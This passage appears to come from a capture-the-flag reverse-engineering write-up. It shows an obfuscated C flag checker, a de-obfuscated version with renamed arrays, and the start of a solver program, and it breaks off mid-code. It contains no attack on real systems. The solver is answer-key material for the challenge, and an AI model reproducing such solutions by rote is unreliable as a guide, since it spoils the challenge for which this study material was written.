class="hljs-number">0x2D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>&#125;;<br>    <span class="hljs-type">int</span> o00O0OO000OO0oooo0o0oo0O000000O00O0O0OO0O0O00OO0OO0O[]=&#123;<span class="hljs-number">0x65</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>&#125;;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(URL);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        o00O0OO000OO0oooo0o0oo0O000000O00O0O0OO0O0O00OO0OO0O[i] ^=  o00O0OO000OO0oooo0o0oo0O000O0OO0O0O00OO0OO0O00000[i+<span class="hljs-number">1</span>];  <br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O[i] ^=  o00O0OO000OO0oooo0o0oo0O0000oooooooO0O0OO0O0O00OO0OO0O[i];  <br>        <br>    &#125;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        o00O0OO000OO0oooo0o0oo0O000000O00O0O0OO0O0O00OO0OO0O[i] -=  o00O0OO000OO0oooo0o0oo0O0000oooooooO0O0OO0O0O00OO0OO0O[i];  <br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>            o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O[i] -=  o00O0OO000OO0oooo0o0oo0O0000oooooooO0O0OO0O0O00OO0OO0O[<span class="hljs-number">47</span> + i];  <br>             o00O0OO000OO0oooo0o0oo0O0000oooooooO0O0OO0O0O00OO0OO0O[i]^=o00O0OO000OO0oooo0o0oo0O000000O00O0O0OO0O0O00OO0OO0O[<span class="hljs-number">51</span>];<br>        <br>&#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O[i] +=  o00O0OO000OO0oooo0o0oo0O000O0OO0O0O00OO0OO0O00000[i];  <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>        <span class="hljs-keyword">if</span>(o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O0O00OO0OO0O[i] != o00O0OO000OO0oooo0o0oo0O0oo000000O0O0OO0O00000O0OO0O[i])&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>改成这样好看一些，然后re</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <br>    <span class="hljs-type">char</span> URL[<span class="hljs-number">46</span>];<br>    <span class="hljs-type">char</span> flag0[<span class="hljs-number">46</span>];<br>    <span class="hljs-built_in">strcpy</span>(flag0, URL);<br>    <span class="hljs-type">char</span> flag1[] = &#123;<span class="hljs-number">0x96</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xd4</span>&#125;;<br>    <span class="hljs-type">int</span>  flag2[] = &#123;<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x8D</span>&#125;;<br>    <span class="hljs-type">int</span>  flag3[] = &#123;<span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>&#125;;<br>    <span class="hljs-type">int</span>  flag4[]=&#123;<span class="hljs-number">0x65</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>&#125;;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(URL);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        flag4[i] ^=  flag3[i+<span class="hljs-number">1</span>];  <br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        flag0[i] ^=  flag2[i];  <br>        <br>    &#125;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        flag4[i] -=  flag2[i];  <br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>            flag0[i] -=  flag2[<span class="hljs-number">47</span> + i];  <br>            flag2[i]^=flag4[<span class="hljs-number">51</span>];<br>        <br>&#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        flag0[i] +=  flag3[i];  <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>        <span class="hljs-keyword">if</span>(flag0[i] !=flag1[i])&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <br>    <span class="hljs-type">char</span> URL[<span class="hljs-number">46</span>]=&#123;&#125;;<br>    <span class="hljs-type">char</span> flag0[<span class="hljs-number">46</span>]=&#123;&#125;;<br><br>     <span class="hljs-type">char</span> flag1[] = &#123;<span class="hljs-number">0x96</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xd4</span>&#125;;<br>    <span class="hljs-type">int</span>  flag2[] = &#123;<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x8D</span>&#125;;<br>    <span class="hljs-type">int</span>  flag3[] = &#123;<span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span 